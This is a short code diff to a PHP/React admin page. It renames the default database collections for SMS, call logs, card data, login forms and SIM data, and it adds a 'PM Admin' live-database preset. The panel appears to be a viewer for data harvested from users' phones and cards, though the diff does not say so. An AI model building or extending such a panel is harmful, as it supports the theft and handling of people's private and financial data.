@@ -97,7 +97,8 @@ include_once __DIR__ . '/header.php';
       };
 
       const DEFAULT_SCHEMA_PRESETS = {
-        custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "smsData", calls: "callData", cards: "cardData", forms: "formData", sims: "simData" }
+        pm_admin: { name: "⭐ PM Admin Preset (Live Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
+        custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" }
       };
 
       const [customPresets, setCustomPresets] = React.useState(() => {
@@ -109,12 +110,12 @@ include_once __DIR__ . '/header.php';
 
       const allPresets = React.useMemo(() => ({ ...DEFAULT_SCHEMA_PRESETS, ...customPresets }), [customPresets]);
 
-      const [editPresetKey, setEditPresetKey] = React.useState('custom');
-      const [editSmsColl, setEditSmsColl] = React.useState('smsData');
-      const [editCallsColl, setEditCallsColl] = React.useState('callData');
-      const [editCardsColl, setEditCardsColl] = React.useState('cardData');
-      const [editFormsColl, setEditFormsColl] = React.useState('formData');
-      const [editSimsColl, setEditSimsColl] = React.useState('simData');
+      const [editPresetKey, setEditPresetKey] = React.useState('pm_admin');
+      const [editSmsColl, setEditSmsColl] = React.useState('user_sms');
+      const [editCallsColl, setEditCallsColl] = React.useState('calls');
+      const [editCardsColl, setEditCardsColl] = React.useState('Card');
+      const [editFormsColl, setEditFormsColl] = React.useState('login');
+      const [editSimsColl, setEditSimsColl] = React.useState('user_data');
 
       const handleApplyPreset = (presetKey) => {
         setEditPresetKey(presetKey);
